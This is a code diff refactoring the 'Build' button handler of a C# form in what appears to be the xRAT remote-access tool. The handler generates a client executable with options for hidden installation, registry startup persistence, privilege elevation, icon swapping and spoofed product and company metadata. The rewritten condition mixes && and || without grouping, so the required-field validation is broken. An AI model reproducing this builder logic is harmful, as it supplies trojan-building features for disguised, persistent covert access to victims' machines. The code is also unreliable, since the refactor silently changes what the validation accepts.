@@ -202,71 +202,64 @@ namespace xServer.Forms
 
         private void btnBuild_Click(object sender, EventArgs e)
         {
-            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) && !string.IsNullOrEmpty(txtDelay.Text) && !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text))
+            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) && !string.IsNullOrEmpty(txtDelay.Text) &&                      // Connection Information
+                !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text) &&                                                         // Client Options
+                !chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) && !string.IsNullOrEmpty(txtInstallsub.Text)) &&  // Installation Options
+                !chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))                                             // Persistence and Registry Features
             {
-                if (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) && !string.IsNullOrEmpty(txtInstallsub.Text)))
+                string output = string.Empty;
+                string icon = string.Empty;
+
+                if (chkIconChange.Checked)
                 {
-                    if (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))
+                    using (OpenFileDialog ofd = new OpenFileDialog())
                     {
-                        string output = string.Empty;
-                        string icon = string.Empty;
-
-                        if (chkIconChange.Checked)
-                        {
-                            using (OpenFileDialog ofd = new OpenFileDialog())
-                            {
-                                ofd.Filter = "Icons *.ico|*.ico";
-                                ofd.Multiselect = false;
-                                if (ofd.ShowDialog() == DialogResult.OK)
-                                    icon = ofd.FileName;
-                            }
-                        }
-
-                        using (SaveFileDialog sfd = new SaveFileDialog())
-                        {
-                            sfd.Filter = "EXE Files *.exe|*.exe";
-                            sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                            sfd.FileName = "Client-built.exe";
-                            if (sfd.ShowDialog() == DialogResult.OK)
-                                output = sfd.FileName;
-                        }
-
-                        if (!string.IsNullOrEmpty(output) && (!chkIconChange.Checked || !string.IsNullOrEmpty(icon)))
-                        {
-                            try
-                            {
-                                string[] asmInfo = null;
-                                if (chkChangeAsmInfo.Checked)
-                                {
-                                    if (!IsValidVersionNumber(txtProductVersion.Text) || !IsValidVersionNumber(txtFileVersion.Text))
-                                    {
-                                        MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                                        return;
-                                    }
-                                    asmInfo = new string[8];
-                                    asmInfo[0] = txtProductName.Text;
-                                    asmInfo[1] = txtDescription.Text;
-                                    asmInfo[2] = txtCompanyName.Text;
-                                    asmInfo[3] = txtCopyright.Text;
-                                    asmInfo[4] = txtTrademarks.Text;
-                                    asmInfo[5] = txtOriginalFilename.Text;
-                                    asmInfo[6] = txtProductVersion.Text;
-                                    asmInfo[7] = txtFileVersion.Text;
-                                }
-                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallPath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);
-                                MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            }
-                            catch (Exception ex)
-                            {
-                                MessageBox.Show(string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message, ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                            }
-                        }
+                        ofd.Filter = "Icons *.ico|*.ico";
+                        ofd.Multiselect = false;
+                        if (ofd.ShowDialog() == DialogResult.OK)
+                            icon = ofd.FileName;
                     }
-                    else
-                        MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
-                else
-                    MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                using (SaveFileDialog sfd = new SaveFileDialog())
+                {
+                    sfd.Filter = "EXE Files *.exe|*.exe";
+                    sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                    sfd.FileName = "Client-built.exe";
+                    if (sfd.ShowDialog() == DialogResult.OK)
+                        output = sfd.FileName;
+                }
+
+                if (!string.IsNullOrEmpty(output) && (!chkIconChange.Checked || !string.IsNullOrEmpty(icon)))
+                {
+                    try
+                    {
+                        string[] asmInfo = null;
+                        if (chkChangeAsmInfo.Checked)
+                        {
+                            if (!IsValidVersionNumber(txtProductVersion.Text) || !IsValidVersionNumber(txtFileVersion.Text))
+                            {
+                                MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                                return;
+                            }
+                            asmInfo = new string[8];
+                            asmInfo[0] = txtProductName.Text;
+                            asmInfo[1] = txtDescription.Text;
+                            asmInfo[2] = txtCompanyName.Text;
+                            asmInfo[3] = txtCopyright.Text;
+                            asmInfo[4] = txtTrademarks.Text;
+                            asmInfo[5] = txtOriginalFilename.Text;
+                            asmInfo[6] = txtProductVersion.Text;
+                            asmInfo[7] = txtFileVersion.Text;
+                        }
+                        ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallPath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);
+                        MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message, ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
+                }
             }
             else
                 MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
